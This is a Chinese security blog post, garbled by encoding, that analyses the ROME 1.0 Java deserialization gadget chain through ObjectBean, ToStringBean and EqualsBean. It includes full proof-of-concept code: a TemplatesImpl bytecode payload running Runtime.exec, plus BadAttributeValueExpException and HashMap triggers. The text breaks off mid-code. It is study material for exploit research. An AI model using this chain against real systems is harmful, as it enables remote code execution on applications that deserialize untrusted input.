è®¢é˜…çš„Javaæ¡†æ¶ã€‚å®ƒæ˜¯å¼€æºçš„ã€‚\nå®ƒæ˜¯ä¸€ä¸ªå¯ä»¥å…¼å®¹å¤šç§æ ¼å¼çš„ feeds è§£æå™¨ï¼Œå¯ä»¥ä»ä¸€ç§æ ¼å¼è½¬æ¢æˆå¦ä¸€ç§æ ¼å¼ï¼Œä¹Ÿå¯è¿”å›æŒ‡å®šæ ¼å¼æˆ–Javaå¯¹è±¡ã€‚\nç¯å¢ƒå‡†å¤‡ ç¯å¢ƒä¾èµ–ï¼š\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;rome\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;rome\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; æµ‹è¯•ç¯å¢ƒï¼š\nJDK 8u411 rome 1.0 éœ€è¦äº†è§£çš„ç±» ToStringBean è¿™ä¸ªç±»ä½äºcom.sun.syndication.feed.impl.ToStringBeanï¼Œè¿™ä¸ªç±»ä¸»è¦å°±æ˜¯çœ‹ä»–çš„toStringæ–¹æ³•ã€‚\nä»–æœ‰ä¸¤ä¸ªtoString()æ–¹æ³•ï¼Œå‰ä¸€ä¸ªæ˜¯æ— å‚çš„publicç±»å‹çš„æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public String toString() { Stack stack = (Stack)PREFIX_TL.get(); String[] tsInfo = (String[])(stack.isEmpty() ? null : stack.peek()); String prefix; if (tsInfo == null) { String className = this._obj.getClass().getName(); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); } else { prefix = tsInfo[0]; tsInfo[1] = prefix; } return this.toString(prefix); } åé¢ä¸€ä¸ªå°±æ˜¯æœ‰å‚çš„privateç±»å‹çš„æ–¹æ³•ï¼Œæºä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 private String toString(String prefix) { StringBuffer sb = new StringBuffer(128); try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } catch (Exception var8) { sb.append(\u0026#34;\\n\\nEXCEPTION: Could not complete \u0026#34; + this._obj.getClass() + \u0026#34;.toString(): \u0026#34; + var8.getMessage() + \u0026#34;\\n\u0026#34;); } return sb.toString(); } å…ˆç®€å•äº†è§£ä¸€ä¸‹ï¼Œåé¢å†ç»†è¯´ã€‚\nObjectBean è¿™ä¸ªç±»ä½äºcom.sun.syndication.feed.impl.ObjectBeanï¼Œå®ƒæ˜¯Rome æä¾›çš„ä¸€ä¸ªå°è£…ç±»å‹ï¼Œåˆå§‹åŒ–æ—¶æä¾›äº†ä¸€ä¸ª Class ç±»å‹å’Œä¸€ä¸ªObject å¯¹è±¡å®ä¾‹è¿›è¡Œå°è£…ï¼š ç°åœ¨ç€é‡äºçœ‹è¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªæ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œä¸‹é¢åˆ†åˆ«è¯´æ˜ä¸€ä¸‹ï¼š\ntoString() ObjectBeanç±»çš„toString()æ–¹æ³•æºä»£ç å¦‚ä¸‹ï¼š\næ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨ToStringBeanç±»çš„toString()æ–¹æ³•ï¼Œå‰é¢è¯´è¿‡ToStringBeanæœ‰ä¸¤ä¸ªtoString()æ–¹æ³•ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰ä¼ å…¥å‚æ•°çš„ï¼Œæ‰€ä»¥è°ƒç”¨çš„æ˜¯ToStringBeançš„ç¬¬ä¸€ä¸ªtoString()æ–¹æ³•ã€‚\nå¹¶ä¸”å¯ä»¥çœ‹å‡ºæœ€åè°ƒç”¨çš„æ˜¯ç¬¬äºŒä¸ªtoStringå¹¶ä¼ å…¥äº†prefixï¼Œè¿™é‡Œç®€å•åˆ†æä¸€ä¸‹å›¾ä¸­æˆ‘ç”»çº¢çº¿ä¸¤æ®µä»£ç ï¼Œå…¶å®å°±æ˜¯è·å–æˆ‘ä¼ å…¥çš„ç±»å®ä¾‹çš„åå­—ã€‚çœ‹ä¸‹é¢ä»£ç å°±èƒ½çœ‹æ‡‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package org.example; public class Haha { public static void main(String[] args) throws Exception { String prefix; Haha _obj =new Haha(); String className = _obj.getClass().getName(); System.out.println(className); prefix = className.substring(className.lastIndexOf(\u0026#34;.\u0026#34;) + 1); System.out.println(prefix); } } ç»“æœä¸ºï¼š\n1 2 org.example.Haha Haha åŸºæœ¬å°±çŸ¥é“äº†ï¼Œå°±æ˜¯ç”¨æ¥è·å–ç±»åçš„ã€‚\nâ€”â€”â€”â€”â€”â€”\nç°åœ¨æˆ‘ä»¬å†æ¥çœ‹ç¬¬äºŒä¸ªtoString()æ–¹æ³•ï¼Œé‡ç‚¹åˆ†æå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 try { PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(this._beanClass); if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } } 1.å…ˆçœ‹BeanIntrospector.getPropertyDescriptors(this._beanClass)ï¼Œæˆ‘ä»¬ç‚¹å¼€æºä»£ç çœ‹ä¸€ä¸‹ï¼š\nè¿™é‡Œç”¨åˆ°äº†_introspectedå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹è¿™ä¸ªå˜é‡çš„èµ‹å€¼ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±ç›´æ¥å°†è¿™ä¸ªå˜é‡èµ‹å€¼ä¸ºäº†HashMapç±»çš„å®ä¾‹ã€‚ç»§ç»­çœ‹getPropertyDescriptorsæ–¹æ³•ï¼Œé€è¡Œæ¥çœ‹ï¼š\n1 PropertyDescriptor[] descriptors = (PropertyDescriptor[])((PropertyDescriptor[])_introspected.get(klass)); æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨HashMapçš„getæ–¹æ³•ï¼Œæ¥è·å–kclasså¯¹åº”çš„å€¼ã€‚\nå†æ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬åœ¨å®ä¾‹åŒ–ObjectBeanæ—¶è°ƒç”¨çš„ToStringBeanç±»çš„æ„é€ æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œçš„kclasså¯¹åº”çš„_beanClassçš„ç±»å‹æ˜¯ä¸€ä¸ªClassç±»å¯¹è±¡ã€‚\nâ€”â€”â€”â€”â€”â€”\nç»§ç»­getPropertyDescriptorsæ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬å¹¶æ²¡æœ‰å¾€BeanIntrospectorçš„HashMapä¸­æ”¾å…¥ä»»ä½•å€¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„get()è¿”å›çš„è‚¯å®šæ˜¯nullã€‚\næ‰€ä»¥é¡ºç†æˆç« è¿›å…¥åˆ°ifè¯­å¥ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 if (descriptors == null) { descriptors = getPDs(klass); _introspected.put(klass, descriptors); } è¿™é‡Œä¼šå…ˆè°ƒç”¨getPDs()æ–¹æ³•ï¼Œç„¶åå†å°†è¿™ä¸ªkclasså’ŒgetPDsçš„ç»“æœputè¿›HasMapé‡Œå½¢æˆä¸€ä¸ªé”®å€¼å¯¹ã€‚\nç°åœ¨å†æ¥çœ‹è¿™é‡Œè°ƒç”¨çš„getPDs()ï¼š è¿™ä¸ªæ–¹æ³•å¤§æ¦‚å°±æ˜¯è·å–è¿™ä¸ªClasså¯¹è±¡æ‰€æœ‰çš„getterå’Œsetterç„¶åæ‰“åŒ…æˆæ•°ç»„è¿”å›ã€‚\næ‰€ä»¥è¿™ä¸ªæ–¹æ³•æœ€ç»ˆä¼šå°†è¿™ä¸ªClasså¯¹è±¡å’Œå®ƒçš„setterrå’Œgetteræ‰“åŒ…æˆé”®å€¼å¯¹æ”¾å…¥BeanIntrospectorç±»çš„HashMapä¸­ã€‚\næœ€åä¼šå°†è¿™ä¸ªæ•°ç»„è¿”å›ï¼š\næ‰€ä»¥è¿™é‡Œçš„getPropertyDescriptors()æ–¹æ³•å°±æ˜¯è·å–æˆ‘ä»¬ä¼ å…¥çš„Classå¯¹è±¡çš„getterå’Œsetteræ–¹æ³•ï¼Œé€»è¾‘è¿˜æ˜¯æŒºå¥½çœ‹æ‡‚çš„ï¼Œå¦‚æœHashMapä¸­æœ‰ç›¸å¯¹åº”çš„é”®å€¼å¯¹å°±ç›´æ¥ä»¥æ•°ç»„å½¢å¼è¿”å›setterå’Œgetteræ–¹æ³•ï¼Œæ²¡æœ‰çš„è¯å°±é‡æ–°æ‰¾ç„¶åè¿”å›ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”\n2.ç»§ç»­çœ‹toString()æ–¹æ³•ï¼Œç°åœ¨å¾—åˆ°äº†ç»“æœï¼Œå‡è®¾æˆ‘ä»¬ä¼ å…¥çš„Classæœ‰getterå’Œsetterï¼Œé‚£ä¹ˆgetPropertyDescriptors()æ–¹æ³•è¿”å›çš„å°±ä¸ä¸ºnullï¼Œå³pdsä¸ä¸ºnullï¼ŒæˆåŠŸè¿›å…¥ifæ¡ä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 if (pds != null) { for(int i = 0; i \u0026lt; pds.length; ++i) { String pName = pds[i].getName(); Method pReadMethod = pds[i].getReadMethod(); if (pReadMethod != null \u0026amp;\u0026amp; pReadMethod.getDeclaringClass() != Object.class \u0026amp;\u0026amp; pReadMethod.getParameterTypes().length == 0) { Object value = pReadMethod.invoke(this._obj, NO_PARAMS); this.printProperty(sb, prefix + \u0026#34;.\u0026#34; + pName, value); } } } ç°åœ¨å°±æ˜¯é‡ç‚¹åˆ†æifè¯­å¥å†…çš„javaè¯­å¥äº†ã€‚\nå¯¹äºè¿™ä¸ªforå¾ªç¯ï¼Œåªè¦èƒ½è¿›å…¥ifè¯­å¥å°±èƒ½è¿›è¡Œè‡³å°‘ä¸€æ¬¡forå¾ªç¯ï¼ˆå› ä¸ºæ•°ç»„ä¸­åªè¦æœ‰ä¸€ä¸ªå€¼é‚£ä¹ˆlengthå°±ä¸º1ï¼‰ï¼Œç»§ç»­çœ‹åé¢çš„ä»£ç ï¼š ç„¶åè¿™é‡Œçš„ getReadMethod() æ–¹æ³•æ˜¯è·å–Classå¯¹è±¡çš„getteræ–¹æ³•ï¼Œå¦‚æœæ­£ç¡®è·å–åˆ°äº†getæ–¹æ³•ï¼Œåº”è¯¥å°±å¯ä»¥é€šè¿‡é‡Œé¢çš„ifæ¡ä»¶ï¼Œç„¶åå°±å¯ä»¥è°ƒç”¨åˆ°invokeæ–¹æ³•ï¼Œè¿™é‡Œçš„NO_PARAMSå˜é‡çš„å€¼ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå¦‚ä¸‹ï¼š è¿™é‡Œå¯ä»¥æŠŠnew Object[0]ç†è§£æˆç±»ä¼¼äºnullè¿™ç§ï¼Œç„¶åå°±å¯ä»¥æ­£å¸¸è°ƒç”¨getteræ–¹æ³•è·å–å€¼ã€‚\nç°åœ¨å°±å‡ºæ¥äº†ä¸€æ¡é“¾ï¼Œç±»ä¼¼CBé“¾è¿™ç§ï¼Œç°åœ¨å°±å¯ä»¥åˆ©ç”¨åˆ°TemplateImplç±»çš„getOutputProperties()æ–¹æ³•ï¼š è¿™æ ·å°±å¯ä»¥ç›´æ¥æ„é€ æ”»å‡»äº†ã€‚ç°åœ¨å°±å¯ä»¥å…ˆå»çœ‹æ”»å‡»æ„é€ çš„toStringéƒ¨åˆ†äº†.\nhashCode() å†ç²˜è¿‡æ¥ä¸€ä¸‹ObjectBeançš„æ„é€ æ–¹æ³•ï¼š\nè¿™é‡ŒObjectBeanç±»çš„hashCode()æ–¹æ³•æºç å¦‚ä¸‹ï¼š\nç„¶åä»ä¸Šé¢çš„åˆå§‹åŒ–æ–¹æ³•å¯ä»¥çœ‹å‡ºè¿™é‡Œä¼šè°ƒç”¨ _equalsBean å˜é‡å¯¹åº”çš„EqualsBeanç±»å®ä¾‹çš„beanHashCode() æ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š è¿™é‡Œå°±åˆæ˜¯ä¸€ä¸ªè§¦å‘toString()æ–¹æ³•çš„åœ°æ–¹ï¼Œå¹¶ä¸”è¿™ä¸ªEqualsBeanç±»çš„_objå˜é‡æ˜¯å¯æ§çš„ï¼š å‰é¢çš„åˆ¤æ–­è¯­å¥å°±æ˜¯çœ‹æˆ‘ä¼ å…¥çš„å‚æ•°objæ˜¯å¦æ˜¯beanClassç±»çš„å®ä¾‹ï¼Œæ˜¯çš„è¯å°±è¿”å›trueï¼Œåä¹‹ä¾ç„¶ï¼Œç”±äº!ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„objéœ€è¦æ˜¯beanClassçš„å®ä¾‹ã€‚åªè¦æˆ‘ä»¬å°†è¿™é‡Œçš„Objåˆæ§åˆ¶ä¸ºä¸€ä¸ªæ¶æ„ObjectBeanç±»å®ä¾‹å³å¯ã€‚\nç°åœ¨å°±åˆå¯ä»¥æ„é€ ä¸€ä¸ªåˆ©ç”¨é“¾äº†ã€‚è¿™é‡Œæ˜¯ç”¨çš„HashMapæ¥æ„é€ ã€‚ç°åœ¨å°±å¯ä»¥ç›´æ¥å»çœ‹æ”»å‡»æ„é€ çš„hashCode()é‚£ä¸€æ­¥äº†ã€‚\nequals() åŒæ ·çš„å†æ¬¡æŠŠObjectBeanæ„é€ æ–¹æ³•ç²˜è¿‡æ¥ä¸€ä¸‹ï¼š ç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„equals()æ–¹æ³•ï¼š æ‰€ä»¥è¿™é‡Œä¼šè°ƒç”¨EqualsBeanç±»çš„beanEquals()æ–¹æ³•ï¼Œæ–¹æ³•é‡ç‚¹æºç å¦‚ä¸‹ï¼š\nè¿™é‡Œçš„ä»£ç å’Œå‰é¢çš„toString()æ–¹æ³•å¤§ç›¸å¾„åº­ï¼Œè¿˜æ˜¯è·å–ä¸€ä¸ªç±»çš„getterå’Œsetteræ–¹æ³•ï¼Œç„¶åè°ƒç”¨invoke()æ–¹æ³•ã€‚\nç°åœ¨çš„æƒ³æ³•å°±æ˜¯å¯¹å‰é¢çš„ifæ¡ä»¶çš„åˆ¤æ–­ï¼Œå¦‚ä¸‹ï¼š å‰é¢å¾ˆå¥½è¿›ï¼Œä¸»è¦å°±æ˜¯æˆ‘é‡ç‚¹æ ‡æ³¨çš„åœ°æ–¹ã€‚è¿™é‡Œå°±æ˜¯è¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„objæ˜¯ _beanClass çš„å®ä¾‹ã€‚è¿™ä¸ªç®€å•ï¼Œä¼ ä¸€ä¸ªimplè¿›å»å°±è¡Œã€‚\nå…ˆæ¥çœ‹æˆ‘ä»¬å¦‚ä½•è°ƒç”¨è¿™ä¸ªequals()æ–¹æ³•ã€‚æ­£å¥½æˆ‘ä»¬çš„CC7ä¸­å°±æœ‰åˆ©ç”¨åˆ°equals()æ–¹æ³•ã€‚è¿™é‡Œå°±æ˜¯ç”¨Hashtableç±»ã€‚\nåç»­å°±å¯ä»¥ç›´æ¥å»çœ‹æ”»å‡»æ„é€ äº†ã€‚\næ”»å‡»æ„é€  toString() å‰é¢è¯´çš„å·²ç»éå¸¸æ¸…æ¥šäº†ã€‚è¿˜æ˜¯æŒºç®€å•çš„ã€‚\né‚£ä¹ˆè¿˜æ˜¯åˆ©ç”¨åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚åŸºæœ¬ç›˜ï¼š Test.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaéƒ¨åˆ†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯æ¥å…¥é“¾å­ã€‚\nä¸»è¦å°±æ˜¯æƒ³åœ¨å“ªé‡Œå¯ä»¥è°ƒç”¨ObjectBeançš„toString()æ–¹æ³•ã€‚è€Œåœ¨CC5ä¸­ç”¨åˆ°çš„BadAttributeValueExpExceptionç±»ååºæ—¶å°±å¯ä»¥è°ƒç”¨åˆ°toStirngæ–¹æ³•ï¼ˆè¿™ä¸ªç±»ä½äºjavax.management.BadAttributeValueExpExceptionï¼‰ï¼š\nåœ¨CC5æˆ‘ä»¬å°±è¯´äº†è¿™é‡Œçš„valObjå…¶å®å¯¹åº”çš„å°±æ˜¯åºåˆ—åŒ–çš„å˜é‡valï¼Œæ‰€ä»¥æˆ‘ä»¬æ§åˆ¶è¿™ä¸ªå˜é‡ä¸ºObjectBean()å³å¯ï¼Œä½¿ç”¨åå°„æ¥æ›´æ”¹valçš„å€¼å³å¯ï¼Œé‚£ä¹ˆæ„é€ çš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(TemplatesImpl.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } å¼¹ä¸äº†ï¼Œç„¶åæˆ‘å»çœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„æ–‡ç« ï¼Œå‘ç°è¿™é‡Œä¸èƒ½ç”¨TemplatesImpl.classï¼Œè€Œæ˜¯Templates.classï¼Œå…³ç³»å¦‚ä¸‹ï¼š åœ¨Templates.classä¸­æœ‰ä¸ªæ¥å£ï¼Œé‡Œé¢å°±æœ‰æˆ‘ä»¬è¦åˆ©ç”¨çš„getOutputPropertiesï¼š\næ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Templates.classæ¥è·å–åˆ°è¿™ä¸ªgetteræ–¹æ³•ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä½¿ç”¨è¿™ä¸ªå‘¢ï¼Ÿæ˜æ˜é€»è¾‘ä¸Šæ²¡æœ‰é—®é¢˜ï¼ŒTemplatesImpl.classå°±æ˜¯æœ‰é—®é¢˜å‘¢ï¼Ÿ\nå…ˆç»™POCï¼Œç„¶åæˆ‘ä»¬å†è°ƒè¯•çœ‹çœ‹ã€‚\næ‰€ä»¥æœ€ç»ˆPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.management.BadAttributeValueExpException; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BadAttributeValueExpException haha = new BadAttributeValueExpException(\u0026#34;fupanc\u0026#34;); ObjectBean x1 = new ObjectBean(Templates.class,impl); setFieldValue(haha,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(haha); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨æ¥è§£å†³ä¸€ä¸‹ä¹‹å‰çš„é—®é¢˜ã€‚æˆ‘æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nç¡®å®æˆåŠŸç›´æ¥è·å–åˆ°äº†æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„getOutputProperties()æ–¹æ³•ï¼Œä½†æ˜¯å½“æˆ‘å¦‚ä¸‹æ‰“æ–­ç‚¹ï¼š\nç„¶åè°ƒè¯•ï¼Œå‘ç°è¿™é‡Œå¹¶ä¸ä¼šè¿›å…¥åˆ°è¿™ä¸ªè¯­å¥ã€‚è¿™è®©æˆ‘æƒ³åˆ°äº†ä¹‹å‰CC5ä¸ªäººæ€è€ƒé‚£é‡Œçš„é—®é¢˜ï¼Œåœ¨æˆ‘ä»¬åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ—¶å€™ï¼Œç”±äºå…¶ä¸­çš„è¿‡ç¨‹ï¼Œå¯¼è‡´äº†åœ¨ä¸­é—´æŸä¸€æ­¥ç›´æ¥æŠ¥é”™é€€å‡ºã€‚\nç»“åˆè¿™ä¸ªï¼Œæˆ‘ä»¬æ¥æƒ³ä¸€ä¸‹å¦‚æœåˆ©ç”¨TemplatesImpl.classï¼Œå› ä¸ºTemplatesImpl.classä¸­çš„getterä¸æ­¢ä¸€ä¸ªï¼Œæ‰€ä»¥å…¶å®å¾ˆæœ‰å¯èƒ½åœ¨å…¶ä¸­æŸä¸ªgetterç›´æ¥æŠ¥é”™é€€å‡ºäº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡èƒ½æˆåŠŸåˆ©ç”¨åˆ°æƒ³ç”¨çš„getOutputProperties()æ–¹æ³•ã€‚\nç„¶åæˆ‘ä»¬å†ç”¨åŸå…ˆé”™è¯¯çš„TemplatesImpl.classè°ƒè¯•ä¸€ä¸‹ï¼Œè¿˜æ˜¯æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š å½“è°ƒç”¨åˆ°getStylesheetDOM()æ—¶ï¼Œinvokeé‚£é‡Œç¡®å®å°±ç›´æ¥æŠ¥é”™é€€å‡ºåˆ°catchéƒ¨åˆ†äº†ï¼š è¿™ä¸ªgetStylesheetDOM()æ–¹æ³•å¦‚ä¸‹ï¼š â€”â€”â€”â€”â€”â€”\nOKï¼Œé—®é¢˜è§£å†³ã€‚\næ‰€ä»¥æ³¨æ„ï¼šåé¢è¿™é‡Œè®°åˆ°ç”¨Templates.classï¼Œè€Œä¸æ˜¯TemplatesImpl.classã€‚\nhashCode() è¿™é‡Œæ˜¯ç”¨çš„HashMapï¼Œä½†æ˜¯åŒæ ·çš„åº”è¯¥HashSetå’ŒHashtableä¹Ÿè¡Œï¼Œè¿™ä¸‰ä¸ªéƒ½æ˜¯æœ‰hashCodeé“¾çš„ã€‚åˆ†æä¸€ä¸‹HashMapç±»ï¼š åŒæ ·çš„åŸºæœ¬ç›˜ï¼š\nTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package org.example; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯æ¥å…¥HashMapã€‚\nè¿˜æ˜¯å¾ˆç®€å•çš„ã€‚\nå°±æ˜¯ä¸ºäº†è§¦å‘æ¶æ„ObjectBeançš„toString()æ–¹æ³•ï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import 